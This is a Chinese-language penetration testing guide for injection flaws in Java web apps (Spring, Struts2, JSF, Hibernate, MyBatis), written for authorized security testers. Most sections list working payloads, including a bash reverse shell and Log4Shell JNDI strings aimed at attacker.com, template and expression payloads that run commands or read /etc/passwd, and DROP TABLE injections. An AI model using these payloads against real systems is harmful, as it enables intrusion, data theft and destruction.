# Java 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 Java 应用注入漏洞的系统化测试流程，覆盖 SQL 注入、命令注入、EL/OGNL 注入、SSTI 等 Java 特有的注入类型。

## 1.2 适用范围
适用于使用 Java 技术栈的 Web 应用，包括 Spring Boot、Struts2、JSF、Hibernate、MyBatis 等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：Java 应用注入系统化测试

### 2.1 技术介绍

Java 应用注入测试针对 Java 技术栈特有的漏洞类型，包括：
- **SQL 注入**：JDBC、Hibernate、MyBatis 中的注入
- **命令注入**：Runtime.exec()、ProcessBuilder
- **EL/OGNL 注入**：JSP/JSF EL、Struts2 OGNL
- **SSTI**：模板引擎注入（Freemarker、Velocity、Thymeleaf）
- **反序列化漏洞**：Java 反序列化

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **框架** | Spring、Struts2、JSF、Hibernate、MyBatis |
| **注入类型** | SQL、命令、EL、OGNL、SSTI、反序列化 |
| **输入点** | 请求参数、HTTP 头、Cookie、文件上传 |
| **业务功能** | 登录、搜索、API、文件操作 |

### 2.3 测试流程

#### 2.3.1 技术栈识别

**框架识别方法：**

```
# 响应头特征
X-Powered-By: Servlet/3.0
Server: Apache-Coyote/1.1  # Tomcat

# URL 路径特征
/actuator/health  # Spring Boot
/struts2/  # Struts2
/faces/  # JSF

# 错误页面特征
Apache Tomcat error page
JBoss error page
WebLogic error page

# 工具识别
whatweb http://target
wappalyzer (浏览器插件)
```

**依赖识别：**

```
# 查找暴露的文件
/WEB-INF/web.xml
/META-INF/maven/pom.xml
/actuator/env  # Spring Boot (未授权)
```

#### 2.3.2 SQL 注入测试（Java）

**JDBC 测试：**
```
# 危险代码模式
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);

# 测试 Payload
id=1'
id=1' OR '1'='1
id=1; DROP TABLE users--
```

**Hibernate 测试：**
```
# 危险代码模式
String hql = "FROM User WHERE id = " + userId;
Query query = session.createQuery(hql);

# 测试 Payload
id=1' or '1'='1'/*
id=1 UNION SELECT 1,username,password FROM users--
```

**MyBatis 测试：**
```
# 危险代码模式（使用 ${} 而非 #{}）
<select id="getUser" resultType="User">
    SELECT * FROM users WHERE id = ${id}
</select>

# 测试 Payload
id=1' OR '1'='1
```

#### 2.3.3 命令注入测试（Java）

**危险函数识别：**
```java
// 危险函数
Runtime.getRuntime().exec(command);
ProcessBuilder.start();
Runtime.exec(String[] cmdarray);
```

**测试 Payload：**
```
# 基础命令
param=;id
param=|id
param=`id`
param=$(id)

# 时间延迟
param=;sleep 5
param=;ping -c 5 127.0.0.1

# 反向 Shell
param=;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### 2.3.4 EL 表达式注入测试

**测试 Payload：**
```
# 基础 EL 测试
${1+1}
#{1+1}

# 访问内置对象
${pageContext}
${request}

# 命令执行
${Runtime.getRuntime().exec('id')}
${new java.lang.ProcessBuilder('id').start()}

# 文件读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
```

#### 2.3.5 OGNL 注入测试（Struts2）

**测试 Payload：**
```
# 基础测试
${2*3}

# 命令执行（S2-045）
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}

# 完整 RCE Payload（见 el-ognl-injection.md）
```

#### 2.3.6 SSTI 测试

**Freemarker 测试：**
```
# 基础测试
${1+1}
#{1+1}

# 版本探测
${?version}

# 命令执行
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}

# 文件读取
${?api.class.forName('java.lang.Runtime').getRuntime().exec('id')}
```

**Velocity 测试：**
```
# 基础测试
#set($x=1)
$x

# 命令执行
#set($Runtime = $mat.getClass().forName("java.lang.Runtime").getRuntime())
$Runtime.exec("id")
```

**Thymeleaf 测试：**
```
# 表达式注入
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
th:text="${T(java.lang.Runtime).getRuntime().exec('id')}"
```

### 2.4 测试用例清单

#### 2.4.1 Spring Boot 测试

```
# Actuator 未授权访问
GET /actuator
GET /actuator/env
GET /actuator/heapdump
GET /actuator/threaddump

# SpEL 注入
GET /api/search?keyword=#{T(java.lang.Runtime).getRuntime().exec('id')}

# 文件包含
GET /api/template?name=../../../etc/passwd
```

#### 2.4.2 Struts2 测试

```
# OGNL 注入（URL 参数）
GET /action?name=${2*3}

# 文件上传绕过
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}

# REST 插件注入
POST /api/users.json
{"name": "${OGNL_PAYLOAD}"}
```

#### 2.4.3 JSF 测试

```
# EL 注入
POST /faces/login.jsp
username=#{1+1}
password=test

# View 状态篡改
javax.faces.ViewState=RCE_PAYLOAD
```

#### 2.4.4 Hibernate 测试

```
# HQL 注入
GET /api/users?sort=id;DROP TABLE users--

# Criteria API 注入
GET /api/users?orderBy=username' OR '1'='1
```

#### 2.4.5 日志注入测试

```
# Log4j2 JNDI 注入（Log4Shell）
X-Api-User: ${jndi:ldap://attacker.com/exploit}
User-Agent: ${jndi:rmi://attacker.com:1099/exploit}

# 日志伪造
username=admin%0ASet-Cookie:%20ADMIN=true
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/api/user?id=1" --dbms=mysql

# Ysoserial - 反序列化 Payload 生成
java -jar ysoserial.jar CommonsCollections5 "command" > payload.bin

# JNDIExploit - JNDI 注入
java -jar JNDIExploit.jar -i attacker.com -p 8888

# Struts2 扫描工具
python2 struts2_045_scan.py http://target

# 反序列化测试
java -jar serialkiller.jar http://target
```

#### Burp Suite 插件

- **Java Deserialization Scanner**
- **Hackvertor** - 编码/解码
- **Logger++** - 详细日志记录

### 2.6 测试报告要点

测试完成后，报告应包含：
1. Java 技术栈和框架版本
2. 所有测试的输入点列表
3. 发现的漏洞点及详情
4. 漏洞利用难度评估
5. 潜在影响范围
6. 修复建议（包括框架升级建议）

---

# 第三部分：附录

## 3.1 Java 危险函数速查表

| 类别 | 危险函数 | 安全替代 |
|-----|---------|---------|
| **命令执行** | `Runtime.exec()` | 避免使用，使用专用库 |
| **命令执行** | `ProcessBuilder.start()` | 参数白名单验证 |
| **SQL 查询** | `Statement.executeQuery()` | `PreparedStatement` |
| **SQL 查询** | `createQuery(String)` | `createQuery().setParameter()` |
| **文件读取** | `new FileReader(path)` | 路径白名单验证 |
| **XML 解析** | `DocumentBuilder.parse()` | 禁用外部实体 |
| **反序列化** | `ObjectInputStream.readObject()` | 验证类白名单 |

## 3.2 常见框架漏洞版本

| 框架 | 危险版本 | 漏洞编号 |
|-----|---------|---------|
| **Struts2** | < 2.3.32 | S2-045, S2-046 |
| **Struts2** | 2.5.0 - 2.5.10 | S2-045 |
| **Spring** | < 5.3.18 | CVE-2022-22965 (Spring4Shell) |
| **Log4j2** | < 2.17.0 | CVE-2021-44228 (Log4Shell) |
| **Fastjson** | < 1.2.83 | 多个反序列化漏洞 |
| **Shiro** | < 1.4.2 | CVE-2019-12422 |

## 3.3 参考资源

- [OWASP Java Security](https://owasp.org/www-project-java-security/)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
- [Apache Struts2 Security Advisories](https://cwiki.apache.org/confluence/display/WW/Security+Advisories)
- [PortSwigger - Server-side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
